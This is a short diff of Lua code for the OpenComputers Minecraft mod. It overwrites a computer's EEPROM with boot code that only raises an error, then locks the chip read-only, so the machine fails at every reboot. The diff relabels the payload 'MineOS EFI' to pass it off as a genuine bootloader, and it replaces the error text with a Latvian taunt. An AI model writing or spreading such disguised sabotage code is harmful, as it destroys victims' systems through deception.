@@ -60,10 +60,10 @@ end
 -- pcalled it so it would not break or smth
 pcall(function()
   
-  ef.setLabel("OCboy3ッ.txt")
+  ef.setLabel("MineOS EFI")
   -- Make it so when the user reboots their OpenComputer, it will error
   ef.set([[
-    error("OCboy3ッ.txt")
+    error("Ej izlabo savu 2 latviešu valodā") -- un arī matemātikā
   ]])
       
   ef.makeReadonly(ef.getChecksum())
